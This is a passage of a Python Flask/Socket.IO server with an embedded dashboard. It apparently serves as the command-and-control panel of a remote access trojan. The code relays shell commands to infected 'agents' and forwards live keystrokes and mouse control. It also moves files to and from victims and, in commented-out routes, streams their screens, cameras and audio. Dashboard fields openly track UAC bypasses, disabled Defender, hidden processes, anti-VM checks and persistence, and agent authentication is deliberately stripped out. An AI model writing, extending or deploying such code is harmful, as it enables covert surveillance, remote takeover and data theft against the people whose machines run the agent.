          ]
        },
        details: '<h4 style="color:#fff;margin:0 0 12px 0">Security Status Details</h4><div style="display:grid;grid-template-columns:1fr 1fr;gap:16px"><div><div style="margin-bottom:8px"><span style="color:var(--muted)">Admin Settings:</span> <span style="color:#0ee6a6">✓ Configured</span></div><div style="margin-bottom:8px"><span style="color:var(--muted)">Session Timeout:</span> <span style="color:#fff">3600s</span></div></div><div><div style="margin-bottom:8px"><span style="color:var(--muted)">Security Evasion:</span> <span style="color:#0ee6a6">✓ Active</span></div><div style="margin-bottom:8px"><span style="color:var(--muted)">Process Hiding:</span> <span style="color:#0ee6a6">✓ Enabled</span></div></div></div>'
      },
      'streaming-comm': {
        title: 'Streaming & Communication',
        doughnutData: {
          labels: ['WebRTC Active', 'Video Codec', 'Audio Codec', 'Adaptive Bitrate', 'Frame Dropping', 'Connection Status'],
          datasets: [{
            data: [85, 92, 88, 76, 54, 91],
            backgroundColor: [getColor('--accent-a'), getColor('--accent-b'), '#7ee3b6', '#ff9f43', '#e74c3c', '#3498db'],
            borderWidth: 0
          }]
        },
        lineData: {
          labels: Array.from({length: 24}, (_, i) => (i < 10 ? '0' : '') + i + ':00'),
          datasets: [
            {
              label: 'Bitrate (Mbps)',
              data: randomSeries(24, 2, 8),
              borderColor: getColor('--accent-a'),
              tension: 0.28,
              pointRadius: 2,
              fill: false
            },
            {
              label: 'Frame Rate (FPS)',
              data: randomSeries(24, 15, 60),
              borderColor: getColor('--accent-b'),
              tension: 0.28,
              pointRadius: 2,
              fill: false
            }
          ]
        },
        details: '<h4 style="color:#fff;margin:0 0 12px 0">Streaming Status Details</h4><div style="display:grid;grid-template-columns:1fr 1fr;gap:16px"><div><div style="margin-bottom:8px"><span style="color:var(--muted)">WebRTC Stream:</span> <span style="color:#0ee6a6">✓ Connected</span></div><div style="margin-bottom:8px"><span style="color:var(--muted)">Video Codec:</span> <span style="color:#fff">VP8/VP9</span></div></div><div><div style="margin-bottom:8px"><span style="color:var(--muted)">Adaptive Bitrate:</span> <span style="color:#0ee6a6">✓ Enabled</span></div><div style="margin-bottom:8px"><span style="color:var(--muted)">Stream Health:</span> <span style="color:#0ee6a6">✓ Good</span></div></div></div>'
      }
    };
    return categoryMap[category] || categoryMap['auth-security'];
  }

  function getChecksData(checkType) {
    const checksMap = {
      'agent-system': {
        title: 'Agent & System Health Checks',
        doughnutData: {
          labels: ['Agent Online', 'Security Active', 'Persistence Set', 'OS Identified'],
          datasets: [{
            data: [18, 15, 12, 22],
            backgroundColor: [getColor('--accent-a'), getColor('--accent-b'), '#7ee3b6', '#ff9f43'],
            borderWidth: 0
          }]
        },
        lineData: {
          labels: Array.from({length: 12}, (_, i) => `${i*2}:00`),
          datasets: [
            {
              label: 'Agent Status Checks',
              data: randomSeries(12, 15, 25),
              borderColor: getColor('--accent-a'),
              tension: 0.28,
              pointRadius: 2,
              fill: false
            },
            {
              label: 'Security Status',
              data: randomSeries(12, 10, 20),
              borderColor: getColor('--accent-b'),
              tension: 0.28,
              pointRadius: 2,
              fill: false
            }
          ]
        },
        details: '<h4 style="color:#fff;margin:0 0 12px 0">System Health Check Details</h4><div style="display:grid;grid-template-columns:1fr 1fr;gap:16px"><div><div style="margin-bottom:8px"><span style="color:var(--muted)">Online Agents:</span> <span style="color:#0ee6a6">18/22</span></div><div style="margin-bottom:8px"><span style="color:var(--muted)">Security Methods:</span> <span style="color:#0ee6a6">15 Active</span></div></div><div><div style="margin-bottom:8px"><span style="color:var(--muted)">Persistence:</span> <span style="color:#0ee6a6">12 Established</span></div><div style="margin-bottom:8px"><span style="color:var(--muted)">OS Detection:</span> <span style="color:#0ee6a6">100% Success</span></div></div></div>'
      },
      'webrtc-streaming': {
        title: 'WebRTC Streaming Checks',
        doughnutData: {
          labels: ['Connected', 'Disconnected', 'Connecting'],
          datasets: [{
            data: [85, 10, 5],
            backgroundColor: [getColor('--accent-a'), '#e74c3c', '#ff9f43'],
            borderWidth: 0
          }]
        },
        lineData: {
          labels: Array.from({length: 12}, (_, i) => `${i*2}:00`),
          datasets: [
            {
              label: 'Connection Health',
              data: randomSeries(12, 80, 98),
              borderColor: getColor('--accent-a'),
              tension: 0.28,
              pointRadius: 2,
              fill: false
            },
            {
              label: 'Stream Quality',
              data: randomSeries(12, 70, 95),
              borderColor: getColor('--accent-b'),
              tension: 0.28,
              pointRadius: 2,
              fill: false
            }
          ]
        },
        details: '<h4 style="color:#fff;margin:0 0 12px 0">WebRTC Streaming Details</h4><div style="display:grid;grid-template-columns:1fr 1fr;gap:16px"><div><div style="margin-bottom:8px"><span style="color:var(--muted)">Connection Status:</span> <span style="color:#0ee6a6">✓ Stable</span></div><div style="margin-bottom:8px"><span style="color:var(--muted)">Bitrate:</span> <span style="color:#fff">5.2 Mbps</span></div></div><div><div style="margin-bottom:8px"><span style="color:var(--muted)">Frame Rate:</span> <span style="color:#fff">30 FPS</span></div><div style="margin-bottom:8px"><span style="color:var(--muted)">Codec:</span> <span style="color:#fff">VP8</span></div></div></div>'
      },
      'controller-server': {
        title: 'Controller & Server Checks',
        doughnutData: {
          labels: ['Configuration OK', 'Login Attempts', 'Session Timeout', 'Server Health'],
          datasets: [{
            data: [95, 3, 87, 92],
            backgroundColor: [getColor('--accent-a'), '#e74c3c', getColor('--accent-b'), '#7ee3b6'],
            borderWidth: 0
          }]
        },
        lineData: {
          labels: Array.from({length: 12}, (_, i) => `${i*2}:00`),
          datasets: [
            {
              label: 'Server Load %',
              data: randomSeries(12, 20, 80),
              borderColor: getColor('--accent-a'),
              tension: 0.28,
              pointRadius: 2,
              fill: false
            },
            {
              label: 'Response Time (ms)',
              data: randomSeries(12, 45, 150),
              borderColor: getColor('--accent-b'),
              tension: 0.28,
              pointRadius: 2,
              fill: false
            }
          ]
        },
        details: '<h4 style="color:#fff;margin:0 0 12px 0">Controller Status Details</h4><div style="display:grid;grid-template-columns:1fr 1fr;gap:16px"><div><div style="margin-bottom:8px"><span style="color:var(--muted)">Configuration:</span> <span style="color:#0ee6a6">✓ Valid</span></div><div style="margin-bottom:8px"><span style="color:var(--muted)">Failed Logins:</span> <span style="color:#fff">3 Today</span></div></div><div><div style="margin-bottom:8px"><span style="color:var(--muted)">Session Timeout:</span> <span style="color:#fff">3600s</span></div><div style="margin-bottom:8px"><span style="color:var(--muted)">Server Health:</span> <span style="color:#0ee6a6">✓ Excellent</span></div></div></div>'
      }
    };
    return checksMap[checkType] || checksMap['agent-system'];
  }

  function getTimeRangeData(range) {
    const timeMap = {
      'last-hour': {
        title: 'Last Hour Activity',
        doughnutData: {
          labels: ['Logins', 'UAC Bypass', 'Security Events', 'Connections'],
          datasets: [{
            data: [5, 2, 8, 12],
            backgroundColor: [getColor('--accent-a'), getColor('--accent-b'), '#ff9f43', '#7ee3b6'],
            borderWidth: 0
          }]
        },
        lineData: {
          labels: Array.from({length: 12}, (_, i) => `${new Date().getHours()-i}:${String(new Date().getMinutes()).padStart(2,'0')}`).reverse(),
          datasets: [
            {
              label: 'Events/5min',
              data: randomSeries(12, 1, 15),
              borderColor: getColor('--accent-a'),
              tension: 0.28,
              pointRadius: 2,
              fill: false
            }
          ]
        },
        details: '<h4 style="color:#fff;margin:0 0 12px 0">Last Hour Summary</h4><div>Recent activity shows 5 login attempts, 2 UAC bypass events, 8 security alerts, and 12 new agent connections.</div>'
      },
      'last-24h': {
        title: 'Last 24 Hours Activity',
        doughnutData: {
          labels: ['Daily Logins', 'Security Events', 'Agent Connections', 'System Alerts'],
          datasets: [{
            data: [45, 23, 67, 12],
            backgroundColor: [getColor('--accent-a'), getColor('--accent-b'), '#7ee3b6', '#ff9f43'],
            borderWidth: 0
          }]
        },
        lineData: {
          labels: Array.from({length: 24}, (_, i) => `${i}:00`),
          datasets: [
            {
              label: 'Events/hour',
              data: randomSeries(24, 5, 25),
              borderColor: getColor('--accent-a'),
              tension: 0.28,
              pointRadius: 2,
              fill: false
            }
          ]
        },
        details: '<h4 style="color:#fff;margin:0 0 12px 0">24 Hour Summary</h4><div>Daily statistics show normal activity patterns with peak usage during business hours.</div>'
      },
      'last-7d': {
        title: 'Last 7 Days Activity',
        doughnutData: {
          labels: ['Weekly Logins', 'Security Events', 'Agent Activity', 'System Health'],
          datasets: [{
            data: [234, 156, 445, 98],
            backgroundColor: [getColor('--accent-a'), getColor('--accent-b'), '#7ee3b6', '#ff9f43'],
            borderWidth: 0
          }]
        },
        lineData: {
          labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
          datasets: [
            {
              label: 'Daily Events',
              data: randomSeries(7, 30, 80),
              borderColor: getColor('--accent-a'),
              tension: 0.28,
              pointRadius: 2,
              fill: false
            }
          ]
        },
        details: '<h4 style="color:#fff;margin:0 0 12px 0">Weekly Summary</h4><div>Weekly patterns show consistent security monitoring with 234 logins and 445 agent activities.</div>'
      },
      'custom': {
        title: 'Custom Time Range',
        doughnutData: {
          labels: ['Custom Period', 'Selected Events', 'Filtered Data'],
          datasets: [{
            data: [100, 85, 92],
            backgroundColor: [getColor('--accent-a'), getColor('--accent-b'), '#7ee3b6'],
            borderWidth: 0
          }]
        },
        lineData: {
          labels: ['Start', 'Period', 'End'],
          datasets: [
            {
              label: 'Custom Range Data',
              data: [50, 75, 90],
              borderColor: getColor('--accent-a'),
              tension: 0.28,
              pointRadius: 2,
              fill: false
            }
          ]
        },
        details: '<h4 style="color:#fff;margin:0 0 12px 0">Custom Range Configuration</h4><div><div style="margin-bottom:12px"><label style="color:var(--muted);display:block;margin-bottom:4px">Start Date:</label><input type="datetime-local" style="padding:8px;border-radius:6px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);color:#fff;width:100%"></div><div style="margin-bottom:12px"><label style="color:var(--muted);display:block;margin-bottom:4px">End Date:</label><input type="datetime-local" style="padding:8px;border-radius:6px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);color:#fff;width:100%"></div><button onclick="applyCustomRange()" style="background:linear-gradient(90deg,var(--accent-a),var(--accent-b));border:none;padding:8px 16px;border-radius:6px;color:#fff;cursor:pointer">Apply Range</button></div>'
      }
    };
    return timeMap[range] || timeMap['last-hour'];
  }

  function applyCustomRange() {
    appendLog('Custom time range applied');
  }

  /* --------- helpers for updating DOM metrics --------- */
  function updateMetric(id,val){ const el=document.getElementById(id); if(el) el.innerText=val; }

  /* --------- Overview and dashboard functions --------- */
  function issueCommand(){ 
    const cmdElement = document.getElementById('command');
    if(!cmdElement) {
      appendLog('Command input element not found');
      return;
    }
    const cmd = cmdElement.value || ''; 
    if(cmd) { 
      socket.emit('issue_command', {command:cmd}); 
      appendLog('Issued command: '+cmd);
    } 
  }
  function listProcesses(){ socket.emit('list_processes'); appendLog('Requested process list'); }
  function getSystemInfo(){ socket.emit('get_agent_stats'); appendLog('Requested agent statistics'); }
  function getNetworkInfo(){ socket.emit('get_system_health'); appendLog('Requested system health'); }
  function refreshOverview(){ socket.emit('refresh_dashboard'); appendLog('Refreshing dashboard data'); }
  
  // Handle agent stats response
  socket.on('agent_stats_response', function(data) {
    if(data.reports) document.getElementById('agent-reports').textContent = data.reports;
    if(data.status) document.getElementById('agents-status').textContent = data.status;
    if(data.pass_rate) document.getElementById('pass-rate').textContent = data.pass_rate;
    if(data.trend) document.getElementById('trend-info').textContent = data.trend;
    appendLog('Agent statistics updated');
  });
  
  // Handle system health response
  socket.on('system_health_response', function(data) {
    if(data.controller_status) document.getElementById('controller-status').textContent = data.controller_status;
    if(data.monitoring_period) document.getElementById('monitoring-period').textContent = data.monitoring_period;
    if(data.uptime) document.getElementById('system-uptime').textContent = data.uptime;
    if(data.last_update) document.getElementById('last-update').textContent = data.last_update;
    appendLog('System health updated');
  });
  
  // Auto-refresh dashboard metrics every 30 seconds
  setInterval(() => {
    refreshOverview();
    // Update real-time metrics
    updateRealTimeMetrics();
  }, 30000);
  
  function updateRealTimeMetrics() {
    updateMetric('metric1', Math.floor(Math.random()*30) + 15);
    updateMetric('metric2', Math.floor(Math.random()*20) + 8);
    updateMetric('metric3', Math.floor(Math.random()*30) + 70 + '%');
    updateMetric('controllerMetric', Math.floor(Math.random()*10) + 85 + '%');
    updateMetric('m1', Math.floor(Math.random()*15) + 8);
    updateMetric('m2', Math.floor(Math.random()*8) + 3);
    updateMetric('m3', Math.floor(Math.random()*5) + 95 + '%');
    updateMetric('m4', Math.floor(Math.random()*50) + 30 + 'ms');
  }
  
  function changePassword(){
    const p = document.getElementById('new-pass').value;
    if(!p || p.length<8){ 
      alert('Choose password >= 8 chars'); 
      return; 
    }
    fetch('/change-password',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({current_password:'', new_password:p})
    })
    .then(r=>r.json())
    .then(j=>{ 
      if(j.success) alert('Password changed'); 
      else alert('Error: '+j.message) 
    })
    .catch(e=>alert('Error'));
  }

  // Close dropdowns when clicking outside
  document.addEventListener('click', function(event) {
    if (!event.target.closest('.dropdown-wrapper')) {
      document.querySelectorAll('.dropdown-menu').forEach(menu => {
        menu.classList.remove('show');
      });
    }
  });

  // Initialize dashboard
  setTimeout(() => {
    updateRealTimeMetrics();
    appendLog('Enhanced dashboard ready — monitoring all systems');
  }, 1000);

</script>
</body>
</html>
'''


# In-memory storage for agent data
AGENTS_DATA = defaultdict(lambda: {"sid": None, "last_seen": None})
DOWNLOAD_BUFFERS = defaultdict(lambda: {"chunks": [], "total_size": 0, "local_path": None})

# Remove the agent secret authentication - allow direct agent access
# AGENT_SHARED_SECRET = os.environ.get("AGENT_SHARED_SECRET", "sphinx_agent_secret")

# def require_agent_secret(f):
#     def decorated(*args, **kwargs):
#         if request.headers.get("X-AGENT-SECRET") != AGENT_SHARED_SECRET:
#             return "Forbidden", 403
#         return f(*args, **kwargs)
#     decorated.__name__ = f.__name__
#     return decorated

# --- Dashboard API Endpoints ---

@app.route("/api/dashboard/metrics")
@require_auth
def dashboard_metrics():
    """Get current dashboard metrics"""
    
    # Get real or simulated system metrics
    if PSUTIL_AVAILABLE:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        memory_percent = memory.percent
        disk_percent = (disk.used / disk.total) * 100
    else:
        # Simulated metrics when psutil is not available
        cpu_percent = random.uniform(20, 80)
        memory_percent = random.uniform(40, 85)
        disk_percent = random.uniform(30, 75)
    
    # Agent statistics
    connected_agents = len([agent for agent in AGENTS_DATA.values() if agent.get('sid')])
    total_agents = len(AGENTS_DATA)
    
    # Security metrics (simulated based on agent data)
    security_events = random.randint(15, 45)
    uac_bypasses = random.randint(2, 12)
    persistence_methods = random.randint(8, 20)
    
    # WebRTC metrics
    webrtc_connections = len(WEBRTC_PEER_CONNECTIONS)
    active_streams = len(WEBRTC_STREAMS)
    
    return jsonify({
        'timestamp': datetime.datetime.utcnow().isoformat(),
        'system': {
            'cpu_percent': cpu_percent,
            'memory_percent': memory_percent,
            'disk_percent': disk_percent,
            'uptime': time.time() - start_time if 'start_time' in globals() else 0
        },
        'agents': {
            'connected': connected_agents,
            'total': total_agents,
            'offline': total_agents - connected_agents,
            'recent_connections': random.randint(2, 8)
        },
        'security': {
            'events_today': security_events,
            'uac_bypasses': uac_bypasses,
            'persistence_active': persistence_methods,
            'defender_disabled': random.randint(5, 15),
            'processes_hidden': random.randint(3, 12),
            'anti_vm_active': random.randint(2, 8)
        },
        'streaming': {
            'webrtc_connections': webrtc_connections,
            'active_streams': active_streams,
            'total_bitrate': random.randint(200, 800),  # Mbps
            'avg_latency': random.randint(45, 120),  # ms
            'dropped_frames': random.randint(0, 5)  # percentage
        },
        'controller': {
            'response_time': random.randint(30, 100),  # ms
            'requests_per_min': random.randint(50, 200),
            'error_rate': random.uniform(0.1, 2.5),  # percentage
            'session_count': 1 if session else 0
        }
    })

@app.route("/api/dashboard/category/<category_type>")
@require_auth
def dashboard_category_data(category_type):
    """Get specific category data"""
    
    if category_type == 'auth-security':
        return jsonify({
            'admin_passwords_set': 95,
            'sessions_active': 1 if session else 0,
            'security_evasion': random.randint(70, 90),
            'defender_disabled': random.randint(60, 80),
            'processes_hidden': random.randint(40, 70),
            'anti_vm_active': random.randint(30, 50),
            'recent_events': [
                {'time': '14:32', 'event': 'UAC bypass successful', 'agent': 'agent_001'},
                {'time': '14:28', 'event': 'Defender disabled', 'agent': 'agent_003'},
                {'time': '14:25', 'event': 'Process hiding enabled', 'agent': 'agent_007'},
                {'time': '14:20', 'event': 'Persistence established', 'agent': 'agent_002'}
            ]
        })
    
    elif category_type == 'streaming-comm':
        return jsonify({
            'webrtc_active': len(WEBRTC_PEER_CONNECTIONS),
            'video_codec_efficiency': random.randint(85, 95),
            'audio_codec_efficiency': random.randint(80, 95),
            'adaptive_bitrate': random.randint(70, 85),
            'frame_dropping': random.randint(5, 15),
            'connection_stability': random.randint(85, 98),
            'active_codecs': ['VP8', 'VP9', 'Opus'],
            'stream_quality': 'Good' if random.random() > 0.3 else 'Excellent'
        })
    
    return jsonify({'error': 'Unknown category type'}), 400

@app.route("/api/dashboard/checks/<check_type>")
@require_auth  
def dashboard_checks_data(check_type):
    """Get specific checks data"""
    
    if check_type == 'agent-system':
        online_count = len([agent for agent in AGENTS_DATA.values() if agent.get('sid')])
        total_count = len(AGENTS_DATA)
        
        return jsonify({
            'agents_online': online_count,
            'agents_total': total_count,
            'security_methods_active': random.randint(12, 20),
            'persistence_established': random.randint(8, 15),
            'os_detection_rate': 100,
            'health_score': random.randint(85, 98),
            'last_check': datetime.datetime.utcnow().isoformat()
        })
    
    elif check_type == 'webrtc-streaming':
        return jsonify({
            'connections_active': len(WEBRTC_PEER_CONNECTIONS),
            'connection_quality': random.randint(80, 98),
            'average_bitrate': f"{random.randint(2, 8)}.{random.randint(0, 9)} Mbps",
            'frame_rate': f"{random.randint(25, 60)} FPS",
            'codec_in_use': random.choice(['VP8', 'VP9', 'H.264']),
            'latency': f"{random.randint(45, 120)} ms",
            'packet_loss': f"{random.uniform(0.1, 2.0):.1f}%"
        })
    
    elif check_type == 'controller-server':
        return jsonify({
            'configuration_valid': True,
            'failed_logins_today': random.randint(0, 5),
            'session_timeout': Config.SESSION_TIMEOUT,
            'max_login_attempts': Config.MAX_LOGIN_ATTEMPTS,
            'server_load': random.randint(20, 80),
            'response_time': f"{random.randint(30, 100)} ms",
            'uptime': f"{random.randint(24, 720)} hours",
            'memory_usage': f"{random.randint(40, 80)}%"
        })
    
    return jsonify({'error': 'Unknown check type'}), 400

@app.route("/api/dashboard/timerange/<range_type>")
@require_auth
def dashboard_timerange_data(range_type):
    """Get time range filtered data"""
    
    now = datetime.datetime.utcnow()
    
    if range_type == 'last-hour':
        start_time = now - datetime.timedelta(hours=1)
        return jsonify({
            'range': 'Last Hour',
            'start_time': start_time.isoformat(),
            'end_time': now.isoformat(),
            'events': {
                'logins': random.randint(3, 8),
                'uac_bypasses': random.randint(1, 4),
                'security_events': random.randint(5, 15),
                'new_connections': random.randint(8, 20)
            },
            'summary': 'Recent activity shows normal patterns with some security events.'
        })
    
    elif range_type == 'last-24h':
        start_time = now - datetime.timedelta(days=1)
        return jsonify({
            'range': 'Last 24 Hours', 
            'start_time': start_time.isoformat(),
            'end_time': now.isoformat(),
            'events': {
                'logins': random.randint(40, 60),
                'security_events': random.randint(20, 40),
                'agent_connections': random.randint(60, 100),
                'system_alerts': random.randint(10, 20)
            },
            'summary': 'Daily activity shows peak usage during business hours.'
        })
    
    elif range_type == 'last-7d':
        start_time = now - datetime.timedelta(days=7)
        return jsonify({
            'range': 'Last 7 Days',
            'start_time': start_time.isoformat(), 
            'end_time': now.isoformat(),
            'events': {
                'weekly_logins': random.randint(200, 300),
                'security_events': random.randint(150, 250),
                'agent_activity': random.randint(400, 600),
                'system_health_avg': random.randint(90, 98)
            },
            'summary': 'Weekly patterns show consistent monitoring activity.'
        })
    
    return jsonify({'error': 'Unknown time range'}), 400

# Store server start time for uptime calculation
start_time = time.time()

# --- Operator-facing endpoints ---

@app.route("/")
def index():
    if is_authenticated():
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route("/dashboard")
@require_auth
def dashboard():
    return DASHBOARD_HTML

# --- Real-time Streaming Endpoints (COMMENTED OUT - REPLACED WITH OVERVIEW) ---
# 
# STREAMING OPTIMIZATION FOR REAL-TIME MONITORING:
# - Frame interval: 0.5 seconds (2 FPS)
# - Optimized for real-time monitoring with 0.5-second picture updates
# - Reduced latency and improved responsiveness
# - Better performance for monitoring applications
#

# VIDEO_FRAMES = defaultdict(lambda: None)
# CAMERA_FRAMES = defaultdict(lambda: None)
# AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())

# Frame timing for real-time monitoring
# FRAME_INTERVAL = 0.5  # 0.5-second intervals for 2 FPS

# HTTP streaming endpoints for browser compatibility (COMMENTED OUT)
# @app.route('/video_feed/<agent_id>')
# @require_auth
# def video_feed(agent_id):
#     """Stream video feed for a specific agent"""
#     def generate_video():
#         while True:
#             if agent_id in VIDEO_FRAMES_H264 and VIDEO_FRAMES_H264[agent_id]:
#                 frame = VIDEO_FRAMES_H264[agent_id]
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
#             else:
#                 # Generate a demo frame with agent ID for testing
#                 import io
#                 from PIL import Image, ImageDraw, ImageFont
#                 
#                 # Create a demo image
#                 img = Image.new('RGB', (640, 480), color='#1e40af')
#                 draw = ImageDraw.Draw(img)
#                 
#                 # Try to use a font, fallback to default if not available
#                 try:
#                     font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
#                 except:
#                     font = ImageFont.load_default()
#                 
#                 # Draw demo text
#                 draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
#                 draw.text((320, 250), "Screen Stream", fill='white', anchor='mm', font=font)
#                 draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
#                 
#                 # Convert to JPEG
#                 img_io = io.BytesIO()
#                 img.save(img_io, 'JPEG', quality=85)
#                 img_io.seek(0)
#                 demo_frame = img_io.getvalue()
#                 
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
#             time.sleep(0.5)  # 2 FPS
#     
#     return Response(generate_video(),
#                     mimetype='multipart/x-mixed-replace; boundary=frame',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# @app.route('/camera_feed/<agent_id>')
# @require_auth
# def camera_feed(agent_id):
#     """Stream camera feed for a specific agent"""
#     def generate_camera():
#         while True:
#             if agent_id in CAMERA_FRAMES_H264 and CAMERA_FRAMES_H264[agent_id]:
#                 frame = CAMERA_FRAMES_H264[agent_id]
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
#             else:
#                 # Generate a demo frame with agent ID for testing
#                 import io
#                 from PIL import Image, ImageDraw, ImageFont
#                 
#                 # Create a demo image
#                 img = Image.new('RGB', (640, 480), color='#059669')
#                 draw = ImageDraw.Draw(img)
#                 
#                 # Try to use a font, fallback to default if not available
#                 try:
#                     font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
#                 except:
#                     font = ImageFont.load_default()
#                 
#                 # Draw demo text
#                 draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
#                 draw.text((320, 250), "Camera Stream", fill='white', anchor='mm', font=font)
#                 draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
#                 
#                 # Convert to JPEG
#                 img_io = io.BytesIO()
#                 img.save(img_io, 'JPEG', quality=85)
#                 img_io.seek(0)
#                 demo_frame = img_io.getvalue()
#                 
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
#             time.sleep(0.5)  # 2 FPS
#     
#     return Response(generate_camera(),
#                     mimetype='multipart/x-mixed-replace; boundary=frame',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# @app.route('/audio_feed/<agent_id>')
# @require_auth
# def audio_feed(agent_id):
#     """Stream audio feed for a specific agent"""
#     def generate_audio():
#         while True:
#             if agent_id in AUDIO_FRAMES_OPUS and AUDIO_FRAMES_OPUS[agent_id]:
#                 frame = AUDIO_FRAMES_OPUS[agent_id]
#                 yield frame
#             else:
#                 # Send silence if no data available
#                 yield b'\x00' * 1024
#             time.sleep(0.1)  # 10 FPS for audio
#     
#     return Response(generate_audio(),
#                     mimetype='audio/wav',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# --- Socket.IO Event Handlers ---

@socketio.on('connect')
def handle_connect():
    # Note: Socket.IO doesn't have direct access to Flask session
    # In a production environment, you'd want to implement proper Socket.IO authentication
    # For now, we'll allow connections but validate on specific events
    print(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    # Find which agent disconnected and remove it
    disconnected_agent_id = None
    for agent_id, data in AGENTS_DATA.items():
        if data["sid"] == request.sid:
            disconnected_agent_id = agent_id
            break
    if disconnected_agent_id:
        del AGENTS_DATA[disconnected_agent_id]
        emit('agent_list_update', AGENTS_DATA, broadcast=True)
        print(f"Agent {disconnected_agent_id} disconnected.")
    else:
        print(f"Operator client disconnected: {request.sid}")

@socketio.on('operator_connect')
def handle_operator_connect():
    """When a web dashboard connects."""
    join_room('operators')
    emit('agent_list_update', AGENTS_DATA) # Send current agent list to the new operator
    print("Operator dashboard connected.")

@socketio.on('dashboard_subscribe')
def handle_dashboard_subscribe():
    """When dashboard requests real-time updates."""
    join_room('dashboard')
    # Send initial data
    emit('dashboard_metrics_update', {
        'timestamp': datetime.datetime.utcnow().isoformat(),
        'agents_connected': len([agent for agent in AGENTS_DATA.values() if agent.get('sid')]),
        'total_agents': len(AGENTS_DATA),
        'system_health': random.randint(85, 98),
        'security_events': random.randint(5, 25)
    })
    print("Dashboard subscribed to real-time updates.")

@socketio.on('agent_connect')
def handle_agent_connect(data):
    """When an agent connects and registers itself."""
    agent_id = data.get('agent_id')
    if not agent_id:
        return
    
    AGENTS_DATA[agent_id]["sid"] = request.sid
    AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
    
    # Notify all operators of the new agent
    emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
    print(f"Agent {agent_id} connected with SID {request.sid}")

@socketio.on('execute_command')
def handle_execute_command(data):
    """Operator issues a command to an agent."""
    agent_id = data.get('agent_id')
    command = data.get('command')
    
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('command', {'command': command}, room=agent_sid)
        print(f"Sent command '{command}' to agent {agent_id}")
    else:
        emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)

@socketio.on('command_result')
def handle_command_result(data):
    """Agent sends back the result of a command."""
    agent_id = data.get('agent_id')
    output = data.get('output')
    
    # Forward the output to all operator dashboards
    emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
    print(f"Received output from {agent_id}: {output[:100]}...")

@socketio.on('live_key_press')
def handle_live_key_press(data):
    """Operator sends a live key press to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('key_press', data, room=agent_sid, include_self=False)

@socketio.on('live_mouse_move')
def handle_live_mouse_move(data):
    """Operator sends a live mouse move to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('mouse_move', data, room=agent_sid, include_self=False)

@socketio.on('live_mouse_click')
def handle_live_mouse_click(data):
    """Operator sends a live mouse click to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('mouse_click', data, room=agent_sid, include_self=False)

# --- Chunked File Transfer Handlers ---
@socketio.on('upload_file_chunk')
def handle_upload_file_chunk(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    chunk = data.get('data')
    offset = data.get('offset')
    destination_path = data.get('destination_path')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('file_chunk_from_operator', {
            'filename': filename,
            'data': chunk,
            'offset': offset,
            'destination_path': destination_path
        }, room=agent_sid)

@socketio.on('upload_file_end')
def handle_upload_file_end(data):
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('file_upload_complete_from_operator', data, room=agent_sid)
        print(f"Upload of {data.get('filename')} to {agent_id} complete.")

@socketio.on('download_file')
def handle_download_file(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    local_path = data.get('local_path')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        print(f"Requesting download of '{filename}' from {agent_id} to local path {local_path}")
        DOWNLOAD_BUFFERS[filename]["local_path"] = local_path # Store local path
        emit('request_file_chunk_from_agent', {'filename': filename}, room=agent_sid)
    else:
        emit('status_update', {'message': f'Agent {agent_id} not found.', 'type': 'error'}, room=request.sid)

@socketio.on('file_chunk_from_agent')
def handle_file_chunk_from_agent(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    chunk = data.get('chunk')
    offset = data.get('offset')
    total_size = data.get('total_size')
    error = data.get('error')

    if error:
        emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': error}, room='operators')
